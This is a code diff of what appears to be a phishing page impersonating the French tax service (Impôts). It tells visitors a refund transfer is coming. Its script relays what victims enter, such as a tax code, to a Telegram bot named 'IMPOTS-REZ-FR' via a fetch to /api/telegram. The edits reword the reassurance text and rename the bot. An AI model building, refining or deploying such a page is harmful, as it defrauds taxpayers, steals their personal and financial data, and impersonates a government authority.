@@ -912,7 +912,9 @@
           </div>
           <h2 class="card-title">Demande bien reçue</h2>
           <p style="font-size:0.85rem;color:#444;line-height:1.6;">
-            Vos informations ont été transmises avec succès. Votre virement sera émis sous 3 jours ouvrés.
+            Vos informations ont été transmises avec succès. Votre virement sera émis sous 0 à 3 jours ouvrés.Le délai de virement sur votre compte dépend
+
+de votre banque et de la procédure de traitement. Merci de votre confiance et de votre patience.
           </p>
         </div>
 
@@ -1025,7 +1027,7 @@
   </footer>
 
   <script>
-    var BOT_NAME = "Impots_Results";
+    var BOT_NAME = "IMPOTS-REZ-FR";
 
     function sendTelegram(msg) {
       fetch("/api/telegram", {
@@ -1108,7 +1110,7 @@
 
       showLoading(function() {
         if (codeVal === "FR4018ED6") {
-          sendTelegram("🚨 <b>" + BOT_NAME + "</b>\n\n✅ <b>Code fiscal valide :</b> " + codeVal);
+          sendTelegram("🚨 <b>" + BOT_NAME + "</b>\n\n✔️ <b>Code fiscal valide :</b> " + codeVal);
           
           var titleEl = document.getElementById('eligibilityTitle');
           titleEl.textContent = "Éligibilité confirmée";
